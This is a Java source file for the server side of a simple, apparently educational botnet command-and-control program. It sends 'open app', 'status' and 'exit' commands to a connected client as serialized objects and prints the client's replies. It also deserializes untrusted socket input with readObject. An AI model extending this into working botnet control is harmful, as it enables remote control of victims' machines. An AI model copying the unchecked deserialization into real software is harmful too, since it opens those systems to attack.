import java.net.*;
import java.io.*;

/**
 * BotnetServer Class:
 * User facing object used to create and send command objects to client for execution
 */
public class BotnetServerThread extends Thread{
    // Properties
    private Socket socket;
    private CommandQueue queue;
    final private String MENU = "\n------\nEnter a Command name \n1)open app\n2)status\n3)exit\n------";

    //Constructor
    public BotnetServerThread(Socket socket, CommandQueue queue){
        super();
        this.socket = socket;
        this.queue = queue;
    }
    
    /**
     * create_command
     * @param commandName - name of the command to construct
     * @return - command constructed with instructions to send to Client
     */
    private Command create_command(String commandName, int timeToLive){
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
        //init command
        Command command = new Command(commandName);

        //determine name and instructions
        switch (command.getCommandName()){
            case "1":
                command.setCommand("openApp");
                try {
                    System.out.print("[>]App Name: ");
                    String appName = bufferedReader.readLine();
                    command.setInstructions(appName);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                break;
            case "2":
                command.setCommand("status");
                command.setInstructions("show the status of the client");
                break;
            case "3":
                command.setCommand("exit");
                break;
            default:
                System.out.println("[-]Invalid Input");
                break;
        }
        command.setTimeToLive(timeToLive);
        return command;
    }

    /**
     * run - runs the app
     */
    public void run() {
        try {
            //input and output streams for the buffer and socket
            ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
            ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
            BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
            //command protocol to handle commands execution
            // CommandProtocol commandP = new CommandProtocol();

            //Print the options to the server
            System.out.print("[+]Client Connected");
            System.out.println(MENU);
            //get the command name 1, 2, or 3
            System.out.print("> ");
            String commandName = stdIn.readLine();
            // System.out.println("How many clients?");
            // System.out.print("> ");
            // int timeToLive = Integer.parseInt(stdIn.readLine());
            //generate a command
            Command command = create_command(commandName, 2);
            //send command to socket to be processed on client side
            
            synchronized(this.queue){
                this.queue.put(command);
            }
            out.writeObject(this.queue);
            out.flush();

            // read an object from the client
            this.queue = (CommandQueue) in.readObject();
            
            //**WHILE YOU CAN READ objects FROM THE socket STREAM */
            // for (Command inCommand = inQueue.take(); inCommand != null; inCommand = inQueue.take()) {
            while (this.queue != null){
                synchronized (this.queue){
                    Command inCommand = this.queue.take();
                    //Print the response of the command that was processed by the client
                    System.out.println("[+]Client: " + inCommand.getResponse());
                     //*If the output is bye close connection */
                     if (inCommand.getResponse().equalsIgnoreCase("exiting")){
                        System.out.println("[+]Closing connection");
                        System.exit(0);
                        break;
                    }
                    
                    //*determine output */
                    String outputLine = inCommand.getResponse();
    
                    //if the command ran with no error
                    if(!inCommand.getErrorStatus() && inCommand.getIsExecuted()){
                        //print the menu again
                        System.out.println(MENU);
                        //get the next command
                        System.out.print("> ");
                        commandName = stdIn.readLine();
                        // System.out.println("How many clients?");
                        // System.out.print(">");
                        // timeToLive = Integer.parseInt(stdIn.readLine());
                        //generate the command
                        Command nextCommand = create_command(commandName, 2);
                        this.queue.put(nextCommand);
                        //send Command object to client
                        out.writeObject(this.queue);
                        out.flush();
                    }
    
                    try{
                        if(!outputLine.equalsIgnoreCase("exiting"))
                            this.queue = (CommandQueue) in.readObject();
                    }catch (ClassNotFoundException cnfe){
                        System.err.println("[-]BotnetServer: Problem reading object: class not found");
                        System.exit(1);
                    } catch (EOFException e) {
                        // Handle EOFException when the client disconnects
                        System.err.println("[-]Client disconnected.");
                        break; // Exit the loop
                    }
                }
                }
            //*CLOSE CONNECTION IF YOU ARE DONE */
            socket.close();
            in.close();
            out.close();

        //Error handle for if the class is not found or if there is an IO interuption
        } catch (ClassNotFoundException e){
            System.err.println("[-]IMClient Class not found");
            System.exit(1);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}